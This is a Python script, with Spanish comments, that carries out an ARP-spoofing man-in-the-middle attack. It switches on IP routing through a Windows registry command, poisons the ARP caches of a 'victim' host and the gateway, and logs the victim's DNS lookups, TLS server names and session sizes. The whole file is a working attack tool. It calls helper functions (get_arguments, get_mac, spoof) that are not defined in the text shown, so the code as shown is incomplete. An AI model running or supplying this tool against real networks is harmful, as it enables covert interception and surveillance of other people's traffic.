from scapy.all import ARP, Ether, sendp, srp, conf, sniff, DNSRR, TCP
import time
import os
import argparse
import sys
from threading import Thread
from datetime import datetime

conf.use_pcap = True

NOISE_DOMAINS = ["arpa", "windowsupdate", "msedge", "waa-pa", "beacons.gcp",
                 "ssl.gstatic.com", "googleapis.com", "crl.", "ocsp."]

CDN_PREFIXES = ["172.217.", "104.18.", "50.116.", "142.250.", "216.58.",
                "35.186.", "34.", "23.", "13.", "52.", "54."]

dns_cache = {}
ip_to_domain = {}

def register_dns(domain, resolved_ips=None):
    dns_cache[domain] = time.time()
    if resolved_ips:
        for ip in resolved_ips:
            ip_to_domain[ip] = domain

def get_domain_for_ip(ip):
    return ip_to_domain.get(ip)

def is_cdn(ip):
    return any(ip.startswith(p) for p in CDN_PREFIXES)

def is_noise(domain):
    return any(x in domain for x in NOISE_DOMAINS)

# Sesiones: key = (src_ip, src_port, dst_ip, dst_port)
sessions = {}

def session_key(pkt):
    if pkt.haslayer("TCP"):
        return (pkt["IP"].src, pkt["TCP"].sport, pkt["IP"].dst, pkt["TCP"].dport)

def get_domain(pkt):
    ip_src = pkt["IP"].src
    ip_dst = pkt["IP"].dst
    return get_domain_for_ip(ip_dst) or get_domain_for_ip(ip_src)

def extract_sni(pkt):
    if pkt.haslayer("Raw") and pkt["TCP"].dport == 443:
        raw = bytes(pkt["Raw"].load)
        if len(raw) > 50 and raw[0] == 0x16:
            try:
                idx = raw.index(b"\x00\x00") + 2
                sni_len = raw[idx+2]
                sni_start = idx + 3
                return raw[sni_start:sni_start+sni_len].decode(errors="ignore")
            except:
                pass
    return None

def ts():
    return datetime.now().strftime("%H:%M:%S")

def print_session(key, s):
    domain = s["domain"] or s["sni"] or key[2]
    extra = ""
    if s["sni"] and s["sni"] != domain:
        extra = f" (SNI: {s['sni']})"
    print(f"[{ts()}] [SESION] {domain}{extra} | {s['duration']:.1f}s | {s['bytes']}B | {s['pkts']}pkts | {s['status']}")

def packet_callback(packet):
    if not packet.haslayer("IP"):
        return
    ip_src = packet["IP"].src
    ip_dst = packet["IP"].dst
    if ip_src != options.target and ip_dst != options.target:
        return

    # DNS
    if packet.haslayer("DNSQR"):
        try:
            domain = packet["DNSQR"].qname.decode().strip('.')
            if is_noise(domain):
                return
            resolved = []
            if packet.haslayer("DNSRR"):
                for i in range(packet["DNS"].ancount):
                    rr = packet["DNS"].an[i]
                    if rr.type == 1:
                        resolved.append(rr.rdata)
            register_dns(domain, resolved)
            print(f"[{ts()}] [DNS] {domain}")
        except:
            pass
        return

    # TCP
    if not packet.haslayer("TCP"):
        return

    key = session_key(packet)
    if not key:
        return

    tcp = packet["TCP"]
    flags = tcp.flags
    size = len(packet)
    now = time.time()

    # Ignorar CDN si no tiene dominio asociado
    domain = get_domain(packet)
    if not domain and is_cdn(ip_dst):
        return

    if key not in sessions:
        sni = extract_sni(packet)
        sessions[key] = {
            "domain": domain,
            "sni": sni,
            "start": now,
            "last": now,
            "bytes": size,
            "pkts": 1,
            "status": "abierta",
            "dports": set()
        }
        start_key = (key[0], key[1], key[2], 0)  # for SYN tracking
    else:
        s = sessions[key]
        s["domain"] = s["domain"] or domain
        s["bytes"] += size
        s["pkts"] += 1
        s["last"] = now
        if not s["sni"]:
            s["sni"] = extract_sni(packet)

    # Detectar cierre de sesión
    if flags & 0x01 or flags & 0x04:
        s = sessions.pop(key)
        s["duration"] = s["last"] - s["start"]
        s["status"] = "FIN" if flags & 0x01 else "RST"
        if s["domain"] or s["sni"]:
            print_session(key, s)

options = get_arguments()

conf.iface = options.interface
conf.verb = 0

print("\n" + "="*60)
print("          ARP SPOOFER + SNIFFER")
print("="*60)

victim_mac = get_mac(options.target, options.interface)
gateway_mac = get_mac(options.gateway, options.interface)

print(f"[+] MAC V\xedctima : {victim_mac}")
print(f"[+] MAC Gateway : {gateway_mac}")

os.system('reg add "HKLM\\SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters" /v IPEnableRouter /t REG_DWORD /d 1 /f >nul 2>&1')

print("[+] Iniciando captura de tr\xe1fico...")
sniff_thread = Thread(target=sniff, kwargs={
    'iface': options.interface,
    'prn': packet_callback,
    'store': False
})
sniff_thread.daemon = True
sniff_thread.start()

print("[+] MITM iniciado. Navega desde la v\xedctima...\n")

try:
    while True:
        spoof(options.target, options.gateway, victim_mac, options.interface)
        spoof(options.gateway, options.target, gateway_mac, options.interface)

        # Flush sesiones abandonadas (>10s sin actividad)
        stale = [k for k, s in sessions.items() if time.time() - s["last"] > 10]
        for k in stale:
            s = sessions.pop(k)
            s["duration"] = s["last"] - s["start"]
            s["status"] = "timeout"
            if s["domain"] or s["sni"]:
                print_session(k, s)

        time.sleep(1.5)
except KeyboardInterrupt:
    print("\n[!] Deteniendo ataque...")
    sys.exit()
